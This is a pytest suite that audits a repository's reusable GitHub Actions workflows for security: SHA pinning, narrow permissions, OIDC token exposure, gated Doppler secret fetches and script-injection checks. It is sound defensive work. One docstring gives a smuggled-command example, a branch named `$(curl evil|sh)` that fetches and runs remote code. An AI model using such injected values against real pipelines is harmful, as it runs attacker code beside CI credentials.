"""The workflows are the product here, and nothing else checks them.

Every repository that calls these workflows inherits whatever they do, with a
token in the environment. The failure modes are quiet ones: an action pinned
to a moving tag changes what runs without a commit; a permission granted too
widely is a gift to anyone who lands code in a dependency; a job that needs a
secret and does not fetch it fails only on the release that needed it.

Every assertion is offline and reads only files in this repository. Each one
was broken on purpose once to confirm it goes red with a message naming the
fix - a check that cannot fail is decoration.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO / ".github" / "workflows"
ACTIONS = REPO / ".github" / "actions"
README = REPO / "README.md"

WORKFLOW_FILES = sorted(WORKFLOWS.glob("*.yml"))
ACTION_FILES = sorted(ACTIONS.glob("*/action.yml"))
# Every workflow a caller may `uses:`. Most rules below apply to all of them.
REUSABLE = [
    p
    for p in WORKFLOW_FILES
    if p.name
    in (
        "python-ci.yml",
        "bash-ci.yml",
        "python-docker-release.yml",
        "python-package-release.yml",
        "security.yml",
        "dependabot-auto-merge.yml",
    )
]
# The subset that fetches CI secrets. The Doppler rules are about those steps,
# so a callable workflow that needs no secret is not held to them; it is held
# to everything else, and it must not grow a fetch without joining this list.
DOPPLER = [
    p for p in REUSABLE if p.name not in ("dependabot-auto-merge.yml", "bash-ci.yml", "python-package-release.yml")
]
# The language CI workflows: each ends in the `CI green` gate branch protection requires.
LANGUAGE_CI = [p for p in REUSABLE if p.name.endswith("-ci.yml")]
OWN = [p for p in WORKFLOW_FILES if p not in REUSABLE]

SELF = "ChiefGyk3D/git-your-ship-together/"
HARDEN_RUNNER = "step-security/harden-runner@"


def load(path: Path) -> dict:
    """`on:` parses as the boolean True under YAML 1.1; use triggers()."""
    return yaml.safe_load(path.read_text())


def triggers(doc: dict) -> dict:
    return doc.get("on") or doc.get(True) or {}


def jobs(doc: dict) -> dict:
    return doc.get("jobs") or {}


def steps_of(job: dict) -> list[dict]:
    return [s for s in (job.get("steps") or []) if isinstance(s, dict)]


def all_steps(path: Path):
    doc = load(path)
    if "runs" in doc:  # composite action
        for step in doc["runs"].get("steps") or []:
            yield "(composite)", step
        return
    for name, job in jobs(doc).items():
        for step in steps_of(job):
            yield name, step


def test_there_is_something_to_check():
    assert len(REUSABLE) == 6, "expected the six callable workflows"
    assert len(DOPPLER) == 3, "expected three of them to fetch CI secrets"
    assert [p.name for p in LANGUAGE_CI] == ["bash-ci.yml", "python-ci.yml"]
    assert ACTION_FILES, "no composite actions found"


def test_only_the_doppler_workflows_fetch_secrets():
    """The split above is a claim about the files; this is the claim checked."""
    for path in REUSABLE:
        fetches = "dopplerhq/secrets-fetch-action@" in path.read_text()
        assert fetches == (path in DOPPLER), (
            f"{path.name} fetches from Doppler: {fetches}, but DOPPLER says {path in DOPPLER}. "
            "A callable workflow that fetches CI secrets belongs in DOPPLER."
        )


# --- supply chain -----------------------------------------------------------

USES = re.compile(r"uses:\s*(?P<action>[A-Za-z0-9._-]+/[A-Za-z0-9._/-]+)@(?P<ref>\S+)(?P<rest>.*)$")
SHA = re.compile(r"^[0-9a-f]{40}$")
VERSION_COMMENT = re.compile(r"^\s*#\s*v\d+\.\d+(\.\d+)?\s*$")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_every_action_is_pinned_to_a_sha_with_a_version_comment(path):
    """A tag re-resolves on every run; a 40-hex SHA cannot.

    That includes references to this repository's own files. A reusable
    workflow cannot name the commit it is running from, so a `@main`
    self-reference would make a caller's pin only as strong as this repo's
    default branch. The Doppler steps are inlined instead (see below).
    """
    for number, line in enumerate(path.read_text().splitlines(), start=1):
        if line.lstrip().startswith("#"):
            continue  # the usage example in the header shows `@<sha>`
        match = USES.search(line)
        if not match:
            continue
        where = f"{path.relative_to(REPO)}:{number}"
        action, ref = match["action"], match["ref"]
        assert SHA.match(ref), f"{where}: {action} is pinned to {ref!r}, not a commit SHA"
        assert VERSION_COMMENT.match(match["rest"]), f"{where}: {action} has no `# vX.Y.Z` comment after the SHA"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_reusable_workflows_never_reference_this_repository_by_branch(path):
    for _, step in all_steps(path):
        uses = str(step.get("uses", ""))
        assert not uses.startswith(SELF), f"{path.name} references {uses}; inline the steps so the caller's pin holds"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_workflow_uses_pull_request_target(path):
    assert "pull_request_target" not in triggers(load(path))


# --- permissions ------------------------------------------------------------


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_workflow_declares_read_only_top_level_permissions(path):
    doc = load(path)
    perms = doc.get("permissions")
    assert perms is not None, f"{path.name} has no top-level permissions block"
    assert perms in ({}, {"contents": "read"}), (
        f"{path.name}: top-level permissions must be contents: read; widen per job"
    )


# Every write any job here may hold, with the reason. A new write is a review
# decision, not a side effect of adding a step.
ALLOWED_WRITES = {
    # Codecov (python-ci's coverage job, never the job that runs the caller's
    # tests) verifies the job's OIDC token directly; Docker Hub credentials
    # (release), Snyk and the gitleaks licence (security) come from Doppler
    # over OIDC; Scorecard publishes its result with the same OIDC identity.
    ("python-ci.yml", "coverage", "id-token"),
    ("python-docker-release.yml", "release", "id-token"),
    ("security.yml", "gitleaks", "id-token"),
    ("security.yml", "snyk", "id-token"),
    ("security.yml", "scorecard", "id-token"),
    # Publishing the image, its signature, SBOM attestation and provenance.
    ("python-docker-release.yml", "release", "packages"),
    ("python-docker-release.yml", "release", "attestations"),
    # SARIF uploads to the Security tab.
    ("python-docker-release.yml", "release", "security-events"),
    # The package release: PyPI trusts the job's OIDC identity, and the
    # GitHub release is created and its assets uploaded with the job's own
    # token, with provenance recorded for every file. Neither job checks
    # anything out; both are skipped unless publish is true off a pull request.
    ("python-package-release.yml", "publish-pypi", "id-token"),
    ("python-package-release.yml", "github-release", "contents"),
    ("python-package-release.yml", "github-release", "id-token"),
    ("python-package-release.yml", "github-release", "attestations"),
    ("security.yml", "codeql", "security-events"),
    ("security.yml", "snyk", "security-events"),
    ("security.yml", "scorecard", "security-events"),
    # dependency-review's summary comment on the pull request.
    ("security.yml", "dependency-review", "pull-requests"),
    # Auto-merge: enabling it on a Dependabot pull request is a write to the
    # pull request and to the branch it will merge. The job checks nothing
    # out, so none of the proposed code runs beside the grant.
    ("dependabot-auto-merge.yml", "auto-merge", "contents"),
    ("dependabot-auto-merge.yml", "auto-merge", "pull-requests"),
    ("dependabot-auto-merge-self.yml", "auto-merge", "contents"),
    ("dependabot-auto-merge-self.yml", "auto-merge", "pull-requests"),
    # This repository dogfoods security.yml on itself.
    ("security-self.yml", "security", "security-events"),
    ("security-self.yml", "security", "pull-requests"),
    ("security-self.yml", "security", "id-token"),
    # And python-ci.yml and python-docker-release.yml on the fixture project:
    # the grants a caller gives, so the called jobs' own permissions blocks
    # are satisfied; the release job never pushes here (push: false).
    ("ci.yml", "fixture-ci", "id-token"),
    ("ci.yml", "fixture-release", "id-token"),
    ("ci.yml", "fixture-release", "packages"),
    ("ci.yml", "fixture-release", "attestations"),
    ("ci.yml", "fixture-release", "security-events"),
    # And python-package-release.yml on the fixture: the grants its two
    # publishing jobs declare, which publish: false skips.
    ("ci.yml", "fixture-package", "contents"),
    ("ci.yml", "fixture-package", "id-token"),
    ("ci.yml", "fixture-package", "attestations"),
}


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_job_grants_a_write_that_is_not_on_the_list(path):
    for job_name, job in jobs(load(path)).items():
        perms = job.get("permissions")
        if not isinstance(perms, dict):
            continue
        for scope, level in perms.items():
            if level in ("read", "none"):
                continue
            assert (path.name, job_name, scope) in ALLOWED_WRITES, (
                f"{path.name}: job {job_name!r} grants {scope}: {level}. "
                "If intended, add it to ALLOWED_WRITES with a reason."
            )


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_reusable_job_declares_its_own_permissions(path):
    """A reusable workflow's job runs with the caller's grant unless it narrows it. Narrow it."""
    for job_name, job in jobs(load(path)).items():
        assert isinstance(job.get("permissions"), dict), f"{path.name}: job {job_name!r} has no permissions block"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_checkout_refuses_to_persist_credentials(path):
    for job_name, step in all_steps(path):
        if not str(step.get("uses", "")).startswith("actions/checkout@"):
            continue
        assert (step.get("with") or {}).get("persist-credentials") is False, (
            f"{path.name}: checkout in job {job_name!r} does not set persist-credentials: false"
        )


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_reusable_job_starts_with_harden_runner(path):
    """The egress policy is only a policy if it is in place before anything else runs."""
    for job_name, job in jobs(load(path)).items():
        steps = steps_of(job)
        if not steps:
            continue  # a gate job with no steps that reach the network
        first = str(steps[0].get("uses", ""))
        assert first.startswith(HARDEN_RUNNER), f"{path.name}: job {job_name!r} does not start with harden-runner"
        with_ = steps[0].get("with") or {}
        assert with_.get("egress-policy") == "${{ inputs.egress-policy }}", (
            f"{path.name}: job {job_name!r} harden-runner ignores the egress-policy input"
        )


# --- script injection -------------------------------------------------------

UNTRUSTED = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|env\.|inputs\.)")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_no_run_block_interpolates_untrusted_context(path):
    """A branch named `$(curl evil|sh)` is a valid branch name.

    Values, including every caller-supplied command, go through env: and are
    read by the shell as data. `bash -c "$COMMAND"` is the one sanctioned way
    to run a caller's command string.
    """
    for job_name, step in all_steps(path):
        body = step.get("run")
        if not isinstance(body, str):
            continue
        found = UNTRUSTED.search(body)
        assert not found, f"{path.relative_to(REPO)}: job {job_name!r} interpolates {found.group(0)!r} into run:"


# --- the Doppler steps are one thing, written in several places ------------


def doppler_script(path: Path) -> list[str]:
    """The `run:` bodies of every step named 'Decide how to authenticate...' in a file."""
    return [
        step["run"] for _, step in all_steps(path) if str(step.get("name", "")).startswith("Decide how to authenticate")
    ]


def test_the_inlined_doppler_script_matches_the_composite_action():
    """Four copies, one source. The composite action is the source; a copy that drifts is a bug."""
    composite = doppler_script(ACTIONS / "doppler-secrets" / "action.yml")
    assert len(composite) == 1
    copies = {path.name: doppler_script(path) for path in DOPPLER}
    assert copies == {
        "python-ci.yml": [composite[0]],
        "python-docker-release.yml": [composite[0]],
        "security.yml": [composite[0]] * 2,
    }, "an inlined Doppler script differs from .github/actions/doppler-secrets/action.yml"


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_doppler_fetch_steps_are_gated_on_the_decision(path):
    """Both fetch steps key off the decide step; an ungated fetch would run with an empty token."""
    doc = load(path)
    secrets = triggers(doc)["workflow_call"].get("secrets") or {}
    assert "DOPPLER_TOKEN" in secrets, f"{path.name} does not declare the DOPPLER_TOKEN fallback secret"
    fetches = [s for _, s in all_steps(path) if str(s.get("uses", "")).startswith("dopplerhq/secrets-fetch-action@")]
    assert fetches, f"{path.name} never fetches from Doppler"
    for step in fetches:
        cond = step.get("if", "")
        assert cond in ("steps.doppler.outputs.mode == 'oidc'", "steps.doppler.outputs.mode == 'token'"), (
            f"{path.name}: fetch step {step.get('name')!r} is gated on {cond!r}"
        )
        with_ = step.get("with") or {}
        for key in ("doppler-project", "doppler-config"):
            assert with_.get(key) == "${{ inputs." + key + " }}", f"{path.name}: fetch step does not pass {key}"
        if cond.endswith("'token'"):
            assert with_.get("doppler-token") == "${{ secrets.DOPPLER_TOKEN }}"
        else:
            assert with_.get("doppler-identity-id") == "${{ inputs.doppler-identity-id }}"


GATE_ENV = {
    "TRUSTED_ONLY": "${{ inputs.doppler-trusted-refs-only }}",
    "EVENT": "${{ github.event_name }}",
    "REF": "${{ github.ref }}",
    "DEFAULT_BRANCH": "${{ github.event.repository.default_branch }}",
}


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_every_decide_step_feeds_the_ref_gate(path):
    """The script refuses untrusted refs only if it is told what the ref is."""
    decides = [s for _, s in all_steps(path) if str(s.get("name", "")).startswith("Decide how to authenticate")]
    assert decides, f"{path.name} has no Doppler decide step"
    for step in decides:
        env = step.get("env") or {}
        for key, value in GATE_ENV.items():
            assert env.get(key) == value, f"{path.name}: decide step env {key} is {env.get(key)!r}, expected {value!r}"


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_trusted_refs_only_defaults_on(path):
    inputs = triggers(load(path))["workflow_call"]["inputs"]
    spec = inputs.get("doppler-trusted-refs-only")
    assert spec and spec.get("type") == "boolean" and spec.get("default") is True, (
        f"{path.name}: doppler-trusted-refs-only must be a boolean defaulting to true"
    )


# A job that holds id-token: write can mint a JWT for this repository; on a
# pull request that job runs the pull request's code. Every such job is either
# kept off pull requests by its `if`, or listed here with why it is acceptable.
PR_ID_TOKEN_EXCEPTIONS = {
    # Only pinned actions run here; nothing from the checkout is executed. The
    # licence it may fetch is for organisation accounts and the Doppler step
    # refuses pull requests anyway.
    ("security.yml", "gitleaks"),
    # Builds and tests the image on pull requests without pushing. The
    # Dockerfile's RUN steps and the docker-test-command execute inside
    # containers that do not carry the runner's OIDC request token, and the
    # Doppler step refuses pull requests.
    ("python-docker-release.yml", "release"),
}


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_no_job_that_can_run_on_a_pull_request_holds_an_oidc_token(path):
    for job_name, job in jobs(load(path)).items():
        perms = job.get("permissions") or {}
        if perms.get("id-token") != "write":
            continue
        cond = str(job.get("if", ""))
        if "github.event_name != 'pull_request'" in cond:
            continue
        assert (path.name, job_name) in PR_ID_TOKEN_EXCEPTIONS, (
            f"{path.name}: job {job_name!r} holds id-token: write and may run on a pull request. "
            "Gate it with github.event_name != 'pull_request' or add it to PR_ID_TOKEN_EXCEPTIONS with a reason."
        )


def test_the_job_running_the_callers_tests_holds_no_oidc_token():
    """`test-command` is the caller's code, and a dependency of it; it must not run beside a token."""
    doc = load(WORKFLOWS / "python-ci.yml")
    coverage = jobs(doc)["coverage"]
    assert coverage["needs"] == "test" or coverage["needs"] == ["test"]
    assert "github.event_name != 'pull_request'" in coverage["if"]


# --- shape ------------------------------------------------------------------


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_job_has_a_timeout(path):
    for job_name, job in jobs(load(path)).items():
        if "uses" in job:
            continue  # a caller of a reusable workflow; the timeout lives inside
        assert job.get("timeout-minutes"), f"{path.name}: job {job_name!r} has no timeout-minutes"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_reusable_workflows_are_only_callable(path):
    assert list(triggers(load(path)).keys()) == ["workflow_call"], f"{path.name} must trigger on workflow_call only"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_has_a_description_and_a_default(path):
    """Callers read the description; the default is what makes `with:` optional."""
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name, spec in inputs.items():
        assert spec.get("description"), f"{path.name}: input {name!r} has no description"
        assert "default" in spec, f"{path.name}: input {name!r} has no default"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_declared_input_is_used(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        assert re.search(rf"inputs\.{re.escape(name)}\b", text), f"{path.name}: input {name!r} is declared, never read"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_used_is_declared(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    used = set(re.findall(r"inputs\.([A-Za-z0-9_-]+)", text))
    assert used <= set(inputs), f"{path.name} reads undeclared inputs: {sorted(used - set(inputs))}"


@pytest.mark.parametrize("path", LANGUAGE_CI, ids=lambda p: p.name)
def test_ci_green_gate_needs_every_other_job(path):
    """Branch protection watches one job; a job left out of its needs merges red.

    The same gate in every language's workflow is what lets BASELINE.md name
    one check shape, `<job> / CI green`, whatever the repository is written in.
    """
    doc = load(path)
    gate = jobs(doc)["ci-green"]
    assert gate["name"] == "CI green"
    assert gate.get("if") == "always()"
    assert set(gate["needs"]) == set(jobs(doc)) - {"ci-green"}
    assert gate["permissions"] == {}


@pytest.mark.parametrize("path", LANGUAGE_CI, ids=lambda p: p.name)
def test_the_job_running_the_callers_tests_holds_no_oidc_token_in_any_language(path):
    doc = load(path)
    assert "id-token" not in (jobs(doc)["test"].get("permissions") or {})


def test_bash_ci_holds_no_token_at_all():
    """A lint needs nothing; a job that fetches nothing has nothing to leak."""
    doc = load(WORKFLOWS / "bash-ci.yml")
    for job_name, job in jobs(doc).items():
        assert job["permissions"] in ({}, {"contents": "read"}), f"bash-ci job {job_name!r} widens its permissions"
    assert "secrets" not in triggers(doc)["workflow_call"]


DOWNLOAD = re.compile(r"\bcurl\b")


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_downloaded_tool_is_checked_against_a_pinned_hash(path):
    """A tool fetched by URL is only as fixed as the URL. A pinned SHA-256 is what makes it a pin."""
    for job_name, step in all_steps(path):
        body = step.get("run")
        if not isinstance(body, str) or not DOWNLOAD.search(body):
            continue
        assert "sha256sum -c" in body, f"{path.name}: job {job_name!r} downloads with curl and never checks a hash"
        env = step.get("env") or {}
        assert any(v.startswith("${{ inputs.") and k.endswith("SHA256") for k, v in env.items()), (
            f"{path.name}: job {job_name!r} checks a hash that is not a workflow input"
        )


def test_security_defaults_are_neutral_where_they_can_be():
    """One job is Python-shaped by default and only by default; the rest read any repository."""
    doc = load(WORKFLOWS / "security.yml")
    inputs = triggers(doc)["workflow_call"]["inputs"]
    assert "actions" in inputs["codeql-languages"]["default"].split(","), (
        "CodeQL should read the workflow files everywhere"
    )
    assert inputs["pip-audit-requirements"]["default"] == "requirements.txt", "the nine callers rely on this default"
    assert inputs["audit-command"]["default"] == ""
    audit = jobs(doc)["dependency-audit"]
    assert "inputs.audit-command != ''" in audit["if"] and "inputs.pip-audit-requirements != ''" in audit["if"]
    assert audit["permissions"] == {"contents": "read"}, "the audit runs a caller's command; it holds nothing"
    names = [s.get("name") for s in steps_of(audit)]
    assert names.index("Audit pinned dependencies (pip-audit)") < names.index("Audit dependencies (audit-command)")


def test_the_package_release_publishes_only_when_told_and_never_beside_the_tree():
    """Every caller command runs in the read-only build job; the two writes run only pinned actions and gh."""
    doc = load(WORKFLOWS / "python-package-release.yml")
    build = jobs(doc)["build"]
    assert build["permissions"] == {"contents": "read"}
    for job_name in ("publish-pypi", "github-release"):
        job = jobs(doc)[job_name]
        cond = str(job["if"])
        assert "inputs.publish" in cond and "github.event_name != 'pull_request'" in cond, f"{job_name} is not gated"
        assert not any(str(s.get("uses", "")).startswith("actions/checkout@") for s in steps_of(job)), (
            f"{job_name} checks the tree out beside a write"
        )
    assert triggers(doc)["workflow_call"]["inputs"]["publish"]["default"] is False
    assert "secrets" not in triggers(doc)["workflow_call"], "nothing here needs a secret"


def test_the_fixture_package_never_publishes():
    doc = load(WORKFLOWS / "ci.yml")
    assert jobs(doc)["fixture-package"]["with"]["publish"] is False


def test_release_signs_attests_and_records_provenance_only_after_a_push():
    doc = load(WORKFLOWS / "python-docker-release.yml")
    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
    gated = (
        "Sign the image (keyless)",
        "Generate the SBOM with syft",
        "Attach the SBOM as a cosign attestation",
        "Record build provenance",
    )
    for name in gated:
        assert name in steps, f"release step {name!r} is missing"
        assert str(steps[name].get("if", "")).startswith("inputs.push"), f"{name!r} must be gated on inputs.push"
    push = steps["Build and push the multi-arch image"]
    assert push["with"]["provenance"] is False and push["with"]["sbom"] is False, (
        "BuildKit attestations would duplicate the explicit cosign/syft artefacts"
    )


def test_a_publishing_build_never_reads_the_actions_cache():
    """The cache is writable from any pull request; a poisoned layer in a signed release is unrecoverable."""
    doc = load(WORKFLOWS / "python-docker-release.yml")
    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
    push = steps["Build and push the multi-arch image"]["with"]
    assert "cache-from" not in push and "cache-to" not in push
    local = steps["Build for this runner and load it"]["with"]
    assert "!inputs.push" in local["cache-from"], "the local build may use the cache only when not publishing"


# --- documentation ----------------------------------------------------------


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_readme_documents_every_input(path):
    """The README is the interface; an input it does not mention does not exist to a caller."""
    text = README.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        assert f"`{name}`" in text, f"README.md does not document input `{name}` of {path.name}"


def test_readme_names_every_workflow_and_the_composite():
    text = README.read_text()
    for path in REUSABLE:
        assert f".github/workflows/{path.name}@" in text, f"README.md does not show how to call {path.name}"
    assert ".github/actions/doppler-secrets" in text


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_the_default_allow_list_is_one_line_of_sorted_host_ports(path):
    """harden-runner reads allowed-endpoints as space-separated host:port entries.

    A newline in the default would make the agent match nothing; a wildcard
    invalidates the list. Sorted so a diff shows one added host, not a reorder.
    """
    inputs = triggers(load(path))["workflow_call"]["inputs"]
    default = inputs["allowed-endpoints"]["default"]
    assert "\n" not in default, f"{path.name}: allowed-endpoints default contains a newline"
    entries = default.split(" ")
    assert entries == sorted(entries), f"{path.name}: allowed-endpoints default is not sorted"
    for entry in entries:
        assert re.fullmatch(r"[a-z0-9.-]+:\d+", entry), f"{path.name}: {entry!r} is not host:port"
    assert inputs["extra-allowed-endpoints"]["default"] == ""


# --- dogfooding ------------------------------------------------------------


def dogfood_callers():
    """(own workflow, job, reusable workflow it calls at this ref)."""
    found = []
    for path in OWN:
        for job_name, job in jobs(load(path)).items():
            uses = str(job.get("uses", ""))
            if uses.startswith("./.github/workflows/"):
                found.append((path.name, job_name, uses.removeprefix("./.github/workflows/").split(" ")[0]))
    return found


def test_every_reusable_workflow_is_run_from_this_repository_at_the_pull_requests_ref():
    """A workflow tested only structurally ships to nine repositories before anything runs it."""
    called = {reusable for _, _, reusable in dogfood_callers()}
    assert called == {p.name for p in REUSABLE}, f"not dogfooded: {sorted({p.name for p in REUSABLE} - called)}"


def test_the_fixture_release_never_publishes():
    doc = load(WORKFLOWS / "ci.yml")
    job = jobs(doc)["fixture-release"]
    assert job["with"]["push"] is False


def test_the_fixture_ci_installs_under_require_hashes():
    doc = load(WORKFLOWS / "ci.yml")
    install = jobs(doc)["fixture-ci"]["with"]["install-command"]
    assert "pip install --require-hashes -r fixture/requirements.txt" in install


def test_this_repositorys_gate_needs_every_other_job():
    doc = load(WORKFLOWS / "ci.yml")
    others = sorted(name for name in jobs(doc) if name != "ci-green")
    assert sorted(jobs(doc)["ci-green"]["needs"]) == others
